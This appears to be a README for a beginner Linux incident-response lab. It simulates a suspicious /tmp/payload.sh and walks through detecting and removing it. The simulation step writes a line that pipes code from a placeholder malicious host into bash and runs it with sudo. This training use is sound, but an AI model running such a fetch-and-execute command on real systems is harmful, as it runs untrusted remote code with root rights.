# 🐧🚨 Day 12 – Suspicious Bash Script Execution (Linux IR)

![GitHub last commit](https://img.shields.io/github/last-commit/BecomingCyber/suspicious-bash-lab-day12?style=flat-square)
![GitHub repo size](https://img.shields.io/github/repo-size/BecomingCyber/suspicious-bash-lab-day12?style=flat-square)
![GitHub](https://img.shields.io/github/license/BecomingCyber/suspicious-bash-lab-day12?style=flat-square)
![GitHub issues](https://img.shields.io/github/issues/BecomingCyber/suspicious-bash-lab-day12?style=flat-square)
[![LinkedIn](https://img.shields.io/badge/-LinkedIn-0072b1?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/mozella-mccoy-flowers)


This hands-on lab simulates and investigates a suspicious bash script (`payload.sh`) executed on a Linux system. Students walk through key phases of the incident response lifecycle using real terminal-based investigation techniques.

---

## 🎯 Objective

To detect, analyze, and respond to a suspicious script placed in the `/tmp` directory, simulating a basic compromise scenario. This exercise strengthens skills in forensic triage, process analysis, and threat containment on Linux.

---

## 📌 Scenario

Your monitoring tool detects a suspicious file `/tmp/payload.sh` attempting to connect to an unknown external domain. You are tasked with investigating this incident using standard Linux command-line tools.

---

## 🛠️ Lab Setup

- **OS Tested:** Kali Linux / Ubuntu 20.04+
- **Tools Required:** `bash`, `curl`, `ps`, `grep`, `find`, `crontab`, `nano`, `auditd` (optional)
- **Permissions:** `sudo` required

---

## 🧪 Simulation Commands

```bash
# Simulate attack script creation
echo -e '#!/bin/bash\ncurl http://malicious.site/payload.sh | bash' | sudo tee /tmp/payload.sh > /dev/null
sudo chmod +x /tmp/payload.sh

# Simulate script execution
sudo bash /tmp/payload.sh &
```

## 🔍 Investigation Steps
🔹 Phase 1: Detection & Analysis
```bash
ps aux | grep '[c]url'                 # Check for active curl processes
sudo find /tmp -name "*.sh"           # Locate suspicious scripts
grep payload.sh ~/.bash_history       # Look for executed command in history
history | grep payload                # Alternate history check
crontab -l                            # Check user crontab
sudo grep -r "payload.sh" /etc/cron*  # Look for persistence via cron
```

🔹 Phase 2: Containment & Eradication
```bash
sudo pkill curl                       # Kill the process
sudo rm -f /tmp/payload.sh           # Delete the script
crontab -e                            # Inspect & clean crontab
sudo systemctl restart cron          # Restart affected services
```
📝 Key Findings

| Aspect             | Result                                                   |
|--------------------|----------------------------------------------------------|
| Script Location    | `/tmp/payload.sh`                                        |
| Behavior           | Used `curl` to download and execute external code        |
| Execution Evidence | Found in `.bash_history`                                 |
| Persistence        | No `crontab` entries or scheduled tasks detected         |
| Action Taken       | Script removed, process killed                           |

## 🔍 Observations & Learnings

- Detected a suspicious script (`/tmp/payload.sh`) attempting to download and execute a remote payload using `curl`.
- Observed how malicious scripts often abuse writable directories like `/tmp` for staging and execution.
- Learned to investigate incidents using key Linux tools such as `ps`, `grep`, `find`, `crontab`, and `.bash_history`.
- Verified there was **no persistence** via user or system crontab.
- Practiced proper incident response steps: detect → analyze → contain → eradicate → document.
- Reinforced the importance of:
  - Mounting `/tmp` with `noexec`
  - Monitoring logs and file changes (AIDE)
  - Educating users on script execution risks
- This exercise provided a realistic, beginner-friendly simulation of Linux incident response — focusing on command-line triage skills essential for SOC analysts.
